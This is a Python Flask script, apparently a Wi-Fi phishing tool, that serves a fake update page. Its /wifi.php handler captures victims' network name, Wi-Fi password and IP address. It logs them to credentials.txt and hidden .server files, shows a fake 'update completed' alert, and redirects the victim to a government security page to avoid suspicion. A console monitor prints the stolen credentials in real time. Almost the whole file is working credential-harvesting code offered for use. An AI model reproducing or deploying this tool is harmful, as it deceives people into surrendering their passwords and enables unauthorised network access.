import os
import time
from flask import Flask, request, send_from_directory
from threading import Thread
import subprocess
from colorama import Fore, Style, init

# Inicializar colorama
init()

app = Flask(__name__)

def print_drawing():
    drawing = f"""{Fore.RED}                    
      _____         
     (_____)   ____ 
     (_)  (_) (____)
     (_)  (_)(_)_(_)
     (_)__(_)(__)__ 
     (_____)  (____)
                    
                    
                        
  _            __   __  
 (_)          (__)_(__) 
 (_)         (_) (_) (_)
 (_)         (_) (_) (_)
 (_)____   _ (_)     (_)
 (______) (_)(_)     (_)
{Style.RESET_ALL}                        
"""
    for line in drawing.splitlines():
        print(line)
        time.sleep(0.1)  # Añade un efecto de escribir

@app.route('/')
def index():
    return send_from_directory('.', 'index.html')

@app.route('/img/<path:path>')
def send_image(path):
    return send_from_directory('img', path)

@app.route('/wifi.php', methods=['POST'])
def handle_data():
    ssid = request.form['ssid']
    password = request.form['pass']
    client_ip = request.remote_addr

    with open("credentials.txt", "a") as cred:
        cred.write(f"Dirección IP: {client_ip}\n")
        cred.write(f"SSID: {ssid}\n")
        cred.write(f"Contraseña: {password}\n")

    try:
        with open(".server/ip.txt", "w") as ipfile:
            ipfile.write(client_ip)
    except Exception as e:
        with open(".server\\ip.txt", "w") as ipfile:
            ipfile.write(client_ip)

    try:
        with open(".server/pass.txt", "w") as passfile:
            passfile.write(password)
    except Exception as e:
        with open(".server\\pass.txt", "w") as passfile:
            passfile.write(password)

    return """
    <script>
        setTimeout(function() {
            alert('Actualización realizada');
            window.location.href = 'https://cncs.gob.do/la-importancia-de-las-actualizaciones/';
        }, 6000);
    </script>
    """

def run_php_server():
    subprocess.run(["php", "-S", "localhost:8000"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

def tail_f(file):
    with open(file, 'r') as f:
        f.seek(0, os.SEEK_END)
        while True:
            line = f.readline()
            if line:
                if "Dirección IP" in line:
                    print(Fore.BLUE + line.strip() + Style.RESET_ALL)
                elif "SSID" in line:
                    print(Fore.RED + line.strip() + Style.RESET_ALL)
                elif "Contraseña" in line:
                    print(Fore.BLUE + line.strip() + Style.RESET_ALL)
            else:
                time.sleep(1)

if __name__ == '__main__':
    print_drawing()

    if not os.path.exists('.server'):
        os.makedirs('.server')

    php_thread = Thread(target=run_php_server)
    php_thread.start()

    flask_thread = Thread(target=lambda: app.run(port=8080, debug=False, use_reloader=False))
    flask_thread.start()

    # Monitorea credentials.txt en tiempo real
    print("Monitoreando credentials.txt en tiempo real:")
    tail_f("credentials.txt")